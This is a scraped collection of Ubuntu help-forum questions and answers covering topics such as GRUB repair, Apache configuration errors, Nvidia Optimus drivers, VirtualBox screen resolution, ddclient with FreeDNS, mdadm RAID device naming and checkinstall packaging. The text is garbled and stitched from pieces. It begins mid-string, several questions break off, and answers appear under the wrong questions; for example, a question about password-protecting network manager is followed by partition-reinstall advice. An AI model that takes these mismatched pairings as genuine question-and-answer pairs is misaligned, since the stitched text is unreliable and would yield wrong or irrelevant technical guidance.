/dev/sda1\n\n", "Q: How to secure network manager with password?

Make sure that it is 'Free' or 'Un-allocated'. Then just use LiveCD or LiveUSB to install Ubuntu. It will automatically capture the free memory.\nBefore installing it, just locate the existing Ubuntu installation folder and delete it. Remember that in your existing way of installation there is no separate drive for Ubuntu, but rather a partition inside a partition, which won't show up in Disk Manager.

What you need to do is to create a Boot Repair USB and boot from it, which will reinstall Ubuntu's bootloader. Detailed instructions for doing this can be found here.\n\nA: According to here, follow these steps:\n\n\n*\n\n*Boot the liveCD\n\n*Open a Terminal and type in the following commands, noting that the first command will put you into the grub “prompt”, and the next 3 commands will be executed there. Also note that hd0,0 implies the first hard drive and the first partition on that drive, which is where you probably installed grub to during installation.

Mark this  partition to be formatted.\nNow is the best part. \nMark the existing /home partition that you are already using to be mounted as \"/home\" but DO NOT FORMAT IT. (that is, don't check the \"format\" box)\nMake sure that you give the existing user name and password when installing the new version . This way, once you reinstall,your system will be installed (old one will be deleted, of course) and your entire home folder will remain as it is. Not only that, much to my pleasant surprise, even my addons, bookmarks, saved passwords - everything was fully intact.\nYou will need to however, update the software, and reinstall all the other software / packages that you want, once again , since the new one will not be compatible.\nYou could also try to google for \"aptoncd\" which is a programme used to backup your existing installation packages, and this can be re-installed on your other computer  (or friend's Comp) running the same version of Ubuntu so you don't need to download the packages each time. You will have to select these packages from the Ubuntu Software Centre. It will not download these packages.\nHope this helps - at least for the future.\n(I did exactly this - had to go back to 12.04 after installing 12.10)\nYash\n", "Q: ubuntu apache2 start, stop, status, restart and reload commands fails Hi, I am new to Ubuntu and I'm still trying to figure this OS out (for work it's brilliant, better than Windows). Before I wrote this question, I did my research via Google, this website and even in StackOverflow.com.\nWhatever error came up, I googled it but with no success on how to solve this. Back to the main point: I tried to install (lamp) apache2 with this guide (in German) and this one(in english).\nThen I got stuck at the start command (with which one is able to start the apache2 server), my first try to run the server was a success until i wrote sudo /etc/init.d/apache2 reload then it showed me an error:\n$ sudo /etc/init.d/apache2 reload\n* Starting web server apache2\n Syntax error on line 1 of /etc/apache2/ports.conf:\n Invalid command 'oder', perhaps misspelled or defined by a module not included in the server configuration\n Action 'reload' failed.\n The Apache error log may have more information.\n[fail]\n\nI didn't even write the word \"oder\" so I closed the shell and opened it anew. It showed the same error. After that, I've done some research and found out that my file (index.html (which is in my /var/www folder)), which I access via the browser, when I type in http://localhost should show up and tell that it was a success. So I removed apache2 and installed it again but now the following errors appear:\n$ sudo /etc/init.d/apache2 start\n* Starting web server apache2\n Syntax error on line 1 of /etc/apache2/ports.conf:\n Invalid command 'oder', perhaps misspelled or defined by a module not included in the server configuration\n Action 'start' failed.\n The Apache error log may have more information.\n[fail]\n\nAnd still, I didn't even write \"oder\" in the command.\nI appreciate every help I can get, further thanks and have a nice day.\n\nA: As the error message says there is an error in the first line of the file /etc/apache2/ports.conf: The word oder isn't allowed there.\nIf you can't figure it it our yourself please edit your question and include the content of that file.\n", "Q: Can I use Ubuntu to reinstall Windows from a recovery disk? I have a laptop that won't boot into Windows 7 64-bit due to a bad update.  It also won't boot from the recovery disk.  I can get into the setup options.  If I install Ubuntu from the Live Disk, can I use this to reinstall Windows from the recovery disk?\n\nA: You can use another large USB pendrive to install Ubuntu to, and this will get your laptop working again.  You will just have to boot off the installed pendrive and run off that.  If you have something like an SD card reader in the laptop you can also do the same thing for a large SD card.\nIn the long term you can get the hard drive in the laptop replaced and you will be able to install Ubuntu to the hard drive, which will boot and run much faster than the USB pendrive.  It sounds like you may need to have the optical drive replaced as well.\nIf you want you can approach the OEM who manufactured your laptop and ask for a set of Windows installation disks for your laptop.  You will need to provide them with the full model number off the label on the bottome (not just the general model number) and they may charge you a fee for providing and shipping the disks to you.\n", "Q: Side by side subtitles Is there a video player in Linux that can display subtitles from a srt file correctly for side by side 3D video?\n\nA: Yes, Bino. It can display the videos in even/odd rows (or other options for different 3D displays) so you don't actually need to set the display to 3D mode, and it can display subtitles. At least... it supposedly can show subtitles, I can't seem to get a .srt file working with it at the moment, but it shows options for subtitle display.\n", "Q: No nvidia-drivers I have a dell M4600 with NVidia Quattro K2000m. After first installing Ubuntu it showed 2 experimental drives in \"Additional drivers\". After reboot, they were gone. And I don't have any xorg.conf. It doesn't exist. And Ubuntu can't recognize the graphics card. It says \"unknown\".\nExternal monitor works through VGA, but not HDMI or display-port.\nAny ideas on what's wrong and what to do?\n\nA: Now i've deactivaded optimus and the drivers showed up. The first disabled the vga-port so I tried the other one on the list. It worked and I got vga-port active again. No displayport though. So I'm pretty much back to where i started, but with better 3D-performance I guess\n\nA: There isn't an /etc/X11/xorg.conf because Ubuntu doesn't put it there, anymore (it seems this was a change that has been in place for a few versions now). \nThis previous question mentions that Optimus is interfering. Chances are, that's your problem, too. Assuming that's the case, you have two options:\n\n\n*\n\n*Install Bumblebee The Bumblebee project brings Optimus support to Linux. This is the recommended path, at least to try first, especially if you want to be mobile with your computer (Optimus is a graphic switching utility that essentially \"clocks down\" your graphics card in order to conserve battery). Installing it is pretty easy, simply run sudo add-apt-repository ppa:bumblebee/stable and update apt with sudo apt-get update. Then run sudo apt-get install bumblebee bumblebee-nvidia. You may need to enable the nVidia drivers again from \"Additional Drivers\" (I don't know for sure, as I haven't used it, personally), but after that you should be good to go.\n\n*Disable Optimus If you can't get Bumblebee working, or don't care about the power management that Optimus provides, then you can disable Optimus. For this, you'll need to enter your computer's BIOS. For Dells, the key to press during boot (at the Dell splash screen, before Ubuntu starts loading) is usually F12. Once your in your BIOS settings, look for an entry named \"Optimus\" and disable it. Save and exit, then boot into Ubuntu and you should be able to enable the nVidia drivers (if Ubuntu doesn't do it for you).\n", "Q: Nginx and automatic updates I'm on Ubuntu 12.04.1 with unattended-upgrades configured for automatic security updates, and I installed Nginx by first adding\ndeb http://nginx.org/packages/ubuntu/ lucid nginx\ndeb-src http://nginx.org/packages/ubuntu/ lucid nginx\n\nto /etc/apt/sources.list file, just as was suggested by the official wiki, and then by\nsudo apt-get update\nsudo apt-get install nginx\n\nwhich installed Nginx with all the standard modules. But now I think I could make good use of one or two of the Nginx optional modules, like the gzip precompression module or some security-related one. So far, I see two ways of adding an optional module to Nginx, one is compiling and installing from the source code and the other is described in this article.\nSo, which of the ways should I choose so that automatic updates still run for and apply to Nginx and its optional modules? Or should I create a cron job with a command/script specific for Nginx instead of using unattended-upgrades utility? Can I choose between volume updates and security-only updates to be automatically applied to the standard and optional modules? And finally, is there a possibility to automatically update Nginx's modules on the fly (without any connections having been dropped), like the documentation suggests it's possible with\nsudo kill -USR2 $( cat /run/nginx.pid )\n\nP.S. Actually I'm not certain if unattended-upgrades utility would automatically update the standard modules in the first place, not enough time has passed since Nginx was installed to say for sure.\n\nA: unattended-upgrades only works for applications you've installed using the package manager and that have a package repository associated with them. Basically, how upgrades/updates in general work is that there is a comparison mechanism that the updater watches for. When that comparison comes up with different values for the installed application versus what's in the repository, a update sequence is triggered (either it will update automatically, or will prompt the user to update, depending on the setup and what the changes are).\nWhen you recompile an application, using either of the methods you've mentioned (Stan's method is, in fact, also recompiling, it's just using dpkg instead of make, you break your install away from the repository.\nThis is reflected in Stan's post by:\n\nАfter you upgrade to a new version nginx, this recompiled package will be overwritten. You will have to do this process again. \n\nTherefore, your best bet will be to use a cron job and custom script to manage the automatic updating for Nginx. The good news is, though, that you should be able to automate the whole process if you're willing to put in the effort to write and test the appropriate script. Once you get it installed the first time, the script shouldn't have to worry about dependencies, just pull the new source and rebuild with the options you want.\n", "Q: Anyone know of any OpenGL apps in Ubuntu 12.04? im trying to find some apps in ubuntu that use opengl mostly. so i can read and learn from the source code. \ni know of Blender, but i looking for a smaller program.\ngoogle just give me installation of opengl, nothing else.\nany suggestions would be help all of those looking for the same.\nthanks\nAlex\n\nA: The package mesa-utils contains some simple OpenGL programs like glxgears.\nRunning\napt-cache rdepends libgl1-mesa-glxq\n\non the command line will give you a list of more packages using OpenGL\n", "Q: Linker cannot find libcv The package I am building on Precise instructs me to install OpenCV using synaptic to get libcv-dev libcvaux-dev and libhighgui-dev.

This is meant so that you won't get feedback. However, my mics are USB mics, and therefore they're not automatically excluded. For this reason, it's necessary to use source=... when loading the loopback module.\nIf you don't successfully shut off the mics as inputs to the loopback, then it's also possible to get confused because you think everything is working, but actually it's not the line-in that's working, it's input going through the air from your stereo speakers to your mics.\nTo figure out which source you need, do \"pacmd list-sources | grep name:\" (note the colon at the end). On my system, the first two on the list were my USB mics, while the fourth was \"alsa_input.pci-0000_00_1b.0.analog-stereo\" and the third was like that but with \".monitor\" on the end of the name. This told me that the source I wanted was number 4.\nSo to start up the loopback:\npactl load-module module-loopback source=4\n\nTo turn it off:\npactl unload-module module-loopback\n\nIf you want to make these settings permanent, see xranby's answer.\nThere turned out to be three different volume controls that I had to find and set appropriately. On my hardware, I had a volume knob on my computer's speakers/headphones. Also, there are two different volume controls in pavucontrol. There's one under the input devices tab, and once you start up the loopback module there will also be a separate control in the playback tab saying something like Built-in Audio Analog Stereo; Port: Line in. If any one of these three is all the way down, then you get nothing. If either of the software ones is too high, you can get distortion.\n", "Q: How can I run two Skype accounts on the same Ubuntu?

Installed the Guest Additions while being in fullscreen mode, and rebooting in fullscreen...\nThis fixed it for me.\n\nA: I know there has benn a long time since last activity in this thread but this helped me and is thanks to you. In my case the tools where already installed.\n\n\n*\n\n*install dkms\n\n*enter full-screen mode\n\n*uninstall the tools\n\n*reboot\n\n*install the tools again\n\n\nA: Running linux 18 on VirtualBox 6.1, I tried several things here. This is what worked for me\nStart the ubuntu virtual environment.\nTerminal: sudo apt-get install virtualbox-guest-dkms virtualbox-guest-x11\nTurn off ubuntu.\nIn the virtual box window:\nFile -> Preferences -> Display -> Maximum Guest Screen Size: None\nStart ubuntu.\nIn applications, open Displays -> Click Resolution (now I had to drag the window, because it couldn't display the various resolution options) -> Choose a different setting (long list to choose from) and press Apply.\n\nA: TLDR: If you have 2 monitors, move the vm window to the second monitor, alter resolution in the vm, then move it back.\nIf you google this issue, there are a lot of threads with the same symptom, all with different solutions. It's clear that this is a symptom that can be caused by multiple root causes. I had multiple Linux Distros (Ubuntu 20.04, 21.04 and 21.10, Debian 10 and 11, and Manjaro) as vms that could not display 1080p resolution , but could display 4:3, 16:10 and lesser 16:9 resolutions. Both of my monitors are maximum 1920x1080, so that should be the obvious inherited resolution of the guest.\nThis problem occurred both in virtualbox and vmware player...\nI moved my vm to my second monitor, noticing that after doing so I was able to full screen the vm and set resolution to 1080p. I was then able to move the vm back to my primary monitor, retaining the 1080p resolution. For some reason, something about my primary monitor is preventing guests from including 1920x1080 in the list of available resolutions, despite it being a 1080p monitor.\nSince it happens on both vmware and virtualbox, its probably not obvious that its a bug in the virtualization software. That being said, if the host can detect my resolution on first boot of my newly formatted pc, the guest should be able to as well, and the logic for that detection would seem to be at fault. For my particular use case, its probably very hard to reproduce and thus not been debugged. Interestingly Fedora 34 got it right the first time, it was able to identify my correct resolution without me having to manually set it...\n\nA: I had the same issue, but now it works. I had to install:\nsudo apt-get install linux-headers-`uname -r`\n\nThe error was logged in: /var/log/vboxadd-install.log\n\nA: I too had the same issue. I installed dkms and then installed the Linux headers as per @Daniel answer. Then rebooted Ubuntu while remaining in full screen mode and it switched straight to the correct 16:9 resolution.\n\nA: *\n\n*Install VirtualBox tools \nCheck before this manual  \nhttps://www.virtualbox.org/manual/ch04.html#idp49439248 \n\n\n*Reboot.\n\n\nA: I have a working method. This will work for sure 100% . This method works in Oracle Virtual Box\nAll you have to do is go to run command prompt as administrator\nThen type the following command-\ncd \"C:\\Program Files\\Oracle\\Virtualbox\"\nAfter typing this command now you have to check what name have you given to your OS when creating a new Profile for OS in virtual box . for e.x. I want my MAC OS to full HD , i named my OS as MAC OS ,so the command will be-\nVBoxManage setextradata \"MAC OS\" VBoxInternal2/EfiGraphicsResolution 1920x1080\nOnly these two commands, just replace MAC OS with your OS name in virtualbox , just restart your virtual box and see the effect ;) thank me later.\n\nA: I had to go to the display settings of ubuntu in the virtual machine and change the display resolution to 1920x1200. Worked fine in my case\n\nA: Following Tommy Maffia's response, I got my VM to stay in the same resolution after a restart. My VM would always open at a default resolution.\n\n*\n\n*Stretch VM to desired resolution (across 2 monitors in my case)\n\n*Move the VM entirely to one monitor (try other monitor if it doesn't work)\n\n*Restart VM\n\n*Move VM to desired positioning across both monitors\n\n*Restart VM\n\nMy VM now opens where it left off on my monitors and at the resolution that the VM shut down at.\n\nA: Launch the Ubuntu Virtual Machine. Go to the settings inside the Ubuntu operating system (not the Virtual Box settings). Inside the Displays tab, set the resolution you want. It works for me.\n\nA: For me , I couldn't get the Linux Mint window to display crystal clear without having the scrollbars showing lost screen space. When I selected the resize in the top right (2 square boxes that resize windows) to get everything to fit, the fonts on the screen turned fuzzy.\nThe answer was to select View > Full Screen Mode from the top menu after I got the warning box on startup about the switch mode. This puts a small hidden VBox menu at the top of the screen which is perfect. You can see \"Full Screen Mode\" on the picture of the menu in one of the posts above.\n", "Q: Mount external HD ubuntu 12.10 Although it's an abundantly treated matter, I'm unable to find an answer valid for my needs. I had a 12.04 installation of ubuntu and I decided to install the 12.10. \nI copied (using GParted) the partition where my system was to an external hd where there is a windows partition. Then I installed the newest ubuntu version and now I want to take back some files (for example my .emacs) from that partition but when I try to mount it, it is not found as sdb and if I mount it from /dev/usb/hddev0 I don't get any output, only a blinking cursor, no errors, no output. I even tried to mount it as an ntfs disk but the result was the same. It's like the hd cannot be detected.\nSo how can I access data to that disk? Could I get them from GParted terminal instead of Ubuntu one?\nThanks\n\nA: I found this in another post. In a \"Terminal\", try entering:\nsudo mkdir /media/${USER}\nIf you have other users on the same machine, say, fred, create /media/fred as well\nAmazing that such a basic issue was not addressed before 12.10 was released!\n", "Q: How to extract only pictures from html directories I have over 200 html files, each containing a png format picture, stored on my harddisk.\nHow can I extract those pictures into a separate folder easily?\n\nA: When you save a complete webpage in your browser, you will have the html file, for example, Mik.html and its accompanying objects (js and pictures etc) in a file called, for example, Mik_files. Obviously, what you want is in those associated folders and not actually within the html file.\nWhat I do is use the following script, which, in this case, finds all the .png images in the accompanying _files folders saved with the html pages. The images are moved to the directory you choose, although it must exist. The script can be modified as you wish-I have used two positional parameters $1 and $2 so you can choose which directory to target ($1) and where to copy the files that are found ($2). Run chmod u+x it to make it executable. You could add another positional parameter if you don't want it to just find .png files each time.\nAs an example, if it is not in your ~/bin, you could call it with:\n./scriptname.sh $HOME/Downloads $HOME/Documents\n\nThe contents of the script:\n#!/bin/bash\n\nfind \"$1\" -type f -iname '*.png' -print0 | \\\nwhile IFS= read -r -d '' f\ndo \n    mv -- \"$f\" \"$2\"  \ndone\n\nexit 0 \n\n", "Q: Cannot see user desktop (Applications, Places, System...) when I log in I am very new to Ubuntu. I recently got a new laptop running Windows 7. I am using Virtual Box and just installed the Ubuntu 12.10 ISO as a new Virtual Machine within Virtual Box. Everything seemed to install just fine and I even added the Guest Additions under Devices.\nThe problem is that I cannot see the menus and my login information.  The virtual machine says it is running; however, I do not have the Applications, Places, System, etc. tray to select from.  Is there something I am supposed to do after logging in to get this?  I entered my password and everything seemed fine, I just don't have those drop-down menus available...\n\nA: Those menus have been phased out ever since the introduction of Unity (circa Ubuntu Netbook 10.10). You should see a launcher bar on the left. If for some reason it's hidden (or set to Autohide), strike the Super key to reveal it. If your Virtual Machine is not configured to capture the Super key, hover your mouse along the left side of the screen. \nThe top icon (with the Ubuntu logo) will, once clicked, reveal your Applications, Files, Places, etc in a new, [debatably] user-friendly manner.\nIf you miss the old style menus, you can always switch back to Gnome Classic.\n", "Q: How can I get ddclient to work with freedns? I use the dynamic DNS service at freedns.afraid.org for my 12.04 server. I had assumed that the protocols would be standardised and that ddclient would just work, but apparently not. I get this message in /var/log/syslog:\nERROR: Invalid update URL (2): unexpected status ()\n\nI tried to use the updated version of ddclient from the alternative PPA described in this answer, but then I hit this error:\nFATAL:    Error loading the Perl module Digest::SHA1 needed for freedns update.\nFATAL:     On Debian, the package libdigest-sha1-perl must be installed.\n\nAnd when I try to install that package, I get this:\nE: Unable to locate package libdigest-sha1-perl\n\nWhich leads me to this bug report, which apparently has no solution. How to proceed?\n\nA: I was able to get FreeDNS to work by simply editing these two lines in /usr/sbin/ddclient:\nFrom:\nmy $sha1_loaded = eval {require Digest::SHA1};\n\nTo:\nmy $sha1_loaded = eval {require Digest::SHA};\n\nFrom:\nimport  Digest::SHA1 (qw/sha1_hex/);\n\nTo:\nimport Digest::SHA (qw/sha1_hex/);\n\n\nA: A comment in the bug report suggests that it is \"easy to change programs to use Digest::SHA instead of Digest::SHA1\".\nSo the full steps are, first, because add-apt-repository is not installed by default:\nsudo apt-get install python-software-properties\n\nThen, as described by izx:\nsudo apt-add-repository ppa:nathan-renniewaldock/ppa\n\nNow, this repository contains many packages, but we only want ddclient. So make a preferences file such as `/etc/apt/preferences.d/nathan-prefs and edit it to look like this:\nPackage: *\nPin: release o=LP-PPA-nathan-renniewaldock\nPin-Priority: 400\n\nPackage: ddclient\nPin: release o=LP-PPA-nathan-renniewaldock\nPin-Priority: 500\n\nNow install ddclient:\nsudo apt-get update && sudo apt-get install ddclient\n\nNow, become root and edit /usr/sbin/ddclient. Look for require Digest::SHA1 and replace it with require Digest::SHA. Then look for import  Digest::SHA1 a few lines later and replace it with import  Digest::SHA.\nFinally, open up /etc/ddclient.conf and make it look something like this (note the protocol):\ndaemon=3600\nprotocol=freedns\nuse=if, if=eth0\nssl=yes\nuse=web, web=myip.dnsomatic.com\nserver=freedns.afraid.org\nlogin=username\npassword='password'\nmydomain.example.com\n\nThe main thing I'm not happy about is hacking a file and breaking Ubuntu's package management. A better solution would be to get the PPA fixed.\n\nA: Until ddclient is fixed, you can manually install the old module it wants:\nsudo apt-get install cpanminus\ncpanm --sudo Digest::SHA1\n\nFree DNS's clients page and ddclient --help provide sample ddclient configurations. Restart ddclient for changes to take effect:\nsudo service ddclient restart\n\n\nA: You can get it from:\nlibdigest-sha1-perl\nYou may need to also install libio-socket-ssl-perl.

I'm facing a really annoying bug, I have set up a Software RAID1 with mdadm, and the setup went just ok with this results\n\n/dev/md/lucas.mgscreativa.com.ar:0\n\nI have also configured mdadm.conf like this\nDEVICE /dev/sda /dev/sdb\n\n# auto-create devices with Debian standard permissions CREATE owner=root group=disk mode=0660 auto=yes\n\n# automatically tag new arrays as belonging to the local system HOMEHOST <system>\n\n# instruct the monitoring daemon where to send mail alerts MAILADDR root\n\n# definitions of existing MD arrays ARRAY /dev/md/lucas.mgscreativa.com.ar:0 metadata=1.2\nname=lucas.mgscreativa.com.ar:0\nUUID=c913486a:e62c7ea1:cfb98b6b:253d1f62\n\nAnd fstab configured like this \n/dev/md/lucas.mgscreativa.com.ar:0 /media/data     ext4\ndefaults,noatime      0       0\n\nBut, some day, my array name suddenly changed from /dev/md/lucas.mgscreativa.com.ar:0 to /dev/md0, so I have done some changes in fstab and mdadm.conf (of course, after hours and hours of tryal and error) and everything went just ok, but today, AGAIN, the MD number changed from /dev/md0 to /dev/md127!!!\nWhat's going on here? is this a bug I guess.\nIs there any way to fix the MD number so my server can work as it shhould, without flaws?\nThanks!\n\nA: First: you are probably having errors in your array.  You need to check its status, immediately. \nExample:\nroot@locutus:~# mdadm --detail /dev/md0\n/dev/md0:\n        Version : 1.2\n  Creation Time : Fri Jun  1 15:30:31 2012\n     Raid Level : raid10\n     Array Size : 1953119232 (1862.64 GiB 1999.99 GB)\n  Used Dev Size : 976559616 (931.32 GiB 1000.00 GB)\n   Raid Devices : 4\n  Total Devices : 4\n    Persistence : Superblock is persistent\n\n    Update Time : Sun Nov 25 21:39:44 2012\n          State : clean \n Active Devices : 4\nWorking Devices : 4\n Failed Devices : 0\n  Spare Devices : 0\n\n         Layout : near=2\n     Chunk Size : 512K\n\n           Name : locutus:0  (local to host locutus)\n           UUID : b81ac63a:51a9b01c:c01812ec:86c534c4\n         Events : 182\n\n    Number   Major   Minor   RaidDevice State\n       0       8        1        0      active sync   /dev/sda1\n       1       8       49        1      active sync   /dev/sdd1\n       2       8       17        2      active sync   /dev/sdb1\n       3       8       33        3      active sync   /dev/sdc1\n\nYou will very likely find that you have errors... those will need to get addressed.\nMoving on, you should change the way your fstab is set up, to use UUID instead of using devicename.  Use the blkid command on your array (or a partition under your array) to get its UUID, then use that UUID to mount it in /etc/fstab.\nExample:\nroot@locutus:~# blkid /dev/mapper/vg0-root\n/dev/mapper/vg0-root: UUID=\"61998221-7b39-49cd-83f7-62fda973218c\" TYPE=\"ext4\" \n\nWith this information, I would set my /etc/fstab entry for root to look like this:\nUUID=61998221-7b39-49cd-83f7-62fda973218c    /    ext4    defaults,errors=remount-ro    0    1\n\nOnce you've done this, your system will find your partitions no matter whether their device names change or not (for example, if drive cables get swapped around).\nYou should also set up your /etc/mdadm/mdadm.conf to find things automatically without needing any particular drive to be in any particular location:\n# mdadm.conf\n#\n# Please refer to mdadm.conf(5) for information about this file.\n#\n\n# by default (built-in), scan all partitions (/proc/partitions) and all\n# containers for MD superblocks. alternatively, specify devices to scan, using\n# wildcards if desired.\n#DEVICE partitions containers\n\n# auto-create devices with Debian standard permissions\nCREATE owner=root group=disk mode=0660 auto=yes\n\n# automatically tag new arrays as belonging to the local system\nHOMEHOST <system>\n\n# instruct the monitoring daemon where to send mail alerts\nMAILADDR root\n\n# definitions of existing MD arrays\nARRAY /dev/md/0 metadata=1.2 UUID=c913486a:e62c7ea1:cfb98b6b:253d1f62 name=lucas.mgscreativa.com.ar:0\n\nNOTE THAT THERE ARE NO DEVICES SPECIFIED IN THIS CONF FILE.  This is a feature, not a bug.  With mdadm.conf set up this way, your system will automatically scan all attached drives looking for anything that belongs to your array, and will assemble them all as /dev/md0.\n\nA: For this answer I am assuming that the array is intact - no failed disks, not other error conditions, just the changing \"device number\". \nWhat should normally work is to stop the array:\n# mdadm --verbose --misc --stop /dev/md127\n\n... fix the line referring to the array in /etc/mdadm/mdadm.conf (i.e. adjust the name of the device). Then assemble it as follows:\n# mdadm --verbose --assemble --update=super-minor --run /dev/md0 /dev/sdaX /dev/sdbX\n\n(adjust the references to the physical devices to your case).\nYou should see an output like this:\nmdadm: looking for devices for /dev/md0\nmdadm: updating superblock of /dev/sdaX with minor number 0\nmdadm: /dev/sdaX is identified as a member of /dev/md0, slot 0.\nmdadm: updating superblock of /dev/sdbX with minor number 0\nmdadm: /dev/sdbX is identified as a member of /dev/md0, slot 1.\nmdadm: added /dev/sdbX to /dev/md0 as 1\nmdadm: added /dev/sdaX to /dev/md0 as 0\nmdadm: /dev/md0 has been started with 2 drives.\n\nAnd if you query the details you should see an updated \"Preferred Minor\" field. Check with:\n# mdadm -Q -D /dev/md0|grep \"Preferred\"\nPreferred Minor : 0\n\nCaveats: also, make sure that you mount the device and write to it. Otherwise the change may not take effect. Also, super-minor appears to be specific to the old metadata format.\nNB: I do not know whether you can affect the \"name\" in the original sense with this. I know you can affect the X in the created /dev/mdX names, however.\n", "Q: Very slow startup after update to 12.04 My hardware:\nDell Latitude D600 laptop\nProcessor: Intel Pentium (r) 1.8 GHz\nMemory 1.2 GiB\nGraphics R200 (RV250 4C66) x86/MMX/SSE2 TCL DRI2\nDisk: 37.7 gb\n\nI did an update from 11.?? using the automatic system update that pops up when you switch/log on.\nEver since then when I switch on the machine it takes approximately one hour to get to the login screen.\nSometimes the actual login will take time too, but sometimes within a couple of minutes I am logged in.\nOnce I am logged in I find I can work normally, the response is not swift, but is neither too slow that I cannot work.\nI was wondering if there was anything I could do to speed things up.\nI deliberately did not do a clean install from disk, because I did not want to loose settings on the machine.\n\nA: Have you tried doing some, 'spring cleaning' removing old kernels?

I did get an error about needed to update a language pack, but that's it. What can I do to make this thing work correctly? Downgrade Unity or GNOME ? Any help is appreciated.\n\nA: The cause of your problem is likely due to slow 3D graphics acceleration. Unity 2D has been removed from Ubuntu 12.10 and the default desktop is now Unity 3D.\nYou have two options:\n\n\n*\n\n*Try sudo apt-get install llvm-dev for graphics acceleration on Ubuntu 12.10\nThis package uses the CPU, as opposed to the GPU for 3D graphics rendering, which may speed up your machine if you have a fast / new processor or PC, but may also add yet another bottleneck to your system if your CPU is slower than your graphics card).\n\n*If that doesn't speed up your machine, you have two (further) options:\n\n\n*\n\n*Downgrade to 12.04 and run it in Unity 2D mode.\n\n*Install a low-resource desktop environment, for example LXDE (used in Lubuntu) or XFCE (used in Xubuntu). You can also use MATE - a fork of the old GNOME 2.x project\nHere's how you can install these desktop environments:\nLubuntu\nsudo apt-get update && sudo apt-get install lubuntu-desktop\n\nXubuntu\nsudo apt-get update && sudo apt-get install xubuntu-desktop\n\nMate\n$ sudo -i # or su -\n# add-apt-repository \"deb http://packages.mate-desktop.org/repo/ubuntu quantal main\"\n# apt-get update\n# apt-get install mate-archive-keyring\n# apt-get update\n# apt-get install mate-core\n# apt-get install mate-desktop-environment\n\n\nA: Most likely Unity (the desktop environment Ubuntu uses by default) emulates OpenGL in software because your graphics driver doesn't support hardware OpenGL well enough.\nDepending on your hardware it may be possible to use another graphics driver (see How do I install extra drivers? for how to install additional drivers) or to tune your existing driver to provide better OpenGL support. For that you should ask a new question that includes the output of\nsudo lshw -C video\n\nand\n/usr/lib/nux/unity_support_test -p\n\non the command line.\nOr you could try another if desktop environment like Gnome classic, Gnome Shell, Xubuntu, ... works better for you.\n", "Q: Black screen on boot and wake - HP Pavilion Dv6 I failed to find a clean answer to this issue. HP Pavilion Dv6, just installed Ubuntu 12.10 after Windows 7 got too annoying. Ubuntu is currently the only OS on the laptop.\nI used to only have 12.04 on here, and everything worked fine. Anyways my issue is, Every time i wake the computer from sleep mode, it only shows a black screen but still seems to be working according to the HDD light.\nA similar issue occurs EVERY time i try booting the computer; it boots to a purple screen, then turns black. But when i hold the power button and try again, it always boots just fine.\n\nA: I have a DV6. In fact I'm on it at the moment.\nI don't know what variant of the DV6 you own. I'm assuming you have a variant with the Nvidia or ATI card. Go to SOFTWARE SOURCES and the last tab should be proprietary drivers. Go ahead and enable the recommended driver. The ADDITIONAL DRIVERS option has be removed as it appears that JOCKEY-GTK has been merged with SOFTWARE SOURCES. Cheers.\n", "Q: Dual monitors with displayport to HDMI I have a Lenovo T510 laptop running Ubuntu 12.04 x64.\nI can run dual monitors with my main display and internal, but not internal and displayport.\nThe displayport is connected to a dp to HDMI converter, which works perfectly in Windows.\nIn Ubuntu, when I connect the TV, the internal screen works, but the TV goes white, and the adapter gets really hot after a while. Also the screen doesn't show up in the displays menu even when I spam the detect displays button.\nAlso, according to Ubuntu, there are no proprietary drivers for this system. The card is a nVidia.\nAny solutions?\n\nA: Although not officially supported by UBUNTU you will need to install the proprietary nvidia driver at nvidia.com if there are no detected drivers. Then i would recommend the ARANDR screen utility if the default one does not do the trick for you. But the nvidia-settings utilty should give you just about everything you need. \n", "Q: Apt-get broken after termination in mid-install Long story short, I tried installing something via apt-get install and accidentally terminated the process through terminal.

This would not be an issue if lightdm allowed configuration of font or used a scrollable menu. \nDiscovered a workaround, select desktop environment and use Tab to cycle pass other environments, the selected environment should remain highlighted with tabbing otherwise click outer edge of menu after select - Tab to the hidden OK button and press Enter to confirm selected desktop environment.\n\nA: You can change part of the screen with this command, but unfortunately the entire screen doesn't respect this setting. Specifically the login box doesn't scale.  I think this is probably a bug.

If you are using compiz, see this question for how to specify window settings, as devilspie might not work with all window managers. \nDevilspie can be installed from the repositories, and I discuss it in much more detail in this other question. In brief, the configuration file for the target program must be in ~/.devilspie and end in .ds. Below is an example of one tailored for gedit, labelled gedit.ds:\n; gedit geometry\n\n(if (is (window_class) \"Gedit\") (geometry \"662x742+0+27\"))\n\nYou will need to specify your own desired geometry that is appropriate for your screen, and put devilspie in startup applications.

(There is no Debian package available.) First I want to create a .deb package out of it, in order to be able to cleanly remove the installed program in the future (see Uninstalling application built from source, If I build a package from source how can I uninstall or remove completely?). Also, installing using a package prevents it from clobbering files from other packages, which cannot be guaranteed if you run the installer or sudo make install.\nCheckinstall\nFrom reading the answers there and elsewhere, I gather the usual solution is to use checkinstall to build the package. Unfortunately, it seems checkinstall does not prevent make install from clobbering system files from other packages. For example, according to Reverting problems caused by checkinstall with gcc build:\n\nI created a Debian package from the install using sudo checkinstall -D make install.\n[...] I removed it using Synaptic Package Manager. As it turns out, [removing] the package checkinstall created from make install tried to remove every single file the installation process touched, including shared gcc libraries like /lib64/libgcc_s.so.\n\nI then tried to tell checkinstall to build the package without installing it, in the hope of bypassing the issue. I created a dummy Makefile:\ninstall:\n    echo \"Bogus\" > /bin/qwertyuiop\n\nand ran sudo checkinstall --install=no. The file /bin/qwertyuiop was created, even though the package was not installed.\nIn my case, I do not trust the installer / make install to not overwrite system files, so this use of checkinstall is ruled out.\nHow can I build the package, without installing it or letting it touch system files?\nIs it possible to run Checkinstall in a fakechrooted debootstrap environment to achieve this? Preferably the build should be done as a normal user rather than root, which would prevent the process from overwriting system files if it goes wrong.\n\nA: You might want to try out debuild to create a binary (deb) file out of source. You would have to prepare the debian folder like you are packaging it. Once you got it right, run the command debuild -b from inside the source directory and it will create a deb file for you. \nYou would also want to take a look at Introduction to Debian packaging.\n\nIf all that is crazy stuff, you would have to just make do with checkinstall messing with system files.\n\nA: I found an answer in a Linux Journal article called Using Checkinstall To Build Packages From Source:\n\nIf you merely want to create the .deb without carrying out the installation, use the command line switch\n\nsudo checkinstall --install=no\n", "Q: Configure 27\" 2560x1440 for a monitor with corrupt EDID I am trying to get a monitor work with my Ubuntu laptop.

After some searching around I found a few posts suggesting to use an active adaptor for mini display port, so I went and bought a mini display to dual link DVI-D adaptor.. When using this adaptor the monitor is recognized by nvidia-settings tool but with incorrect resolution information. \n\nAs you can see the monitor is incorrectly recognized and there are no other resolution available to set.

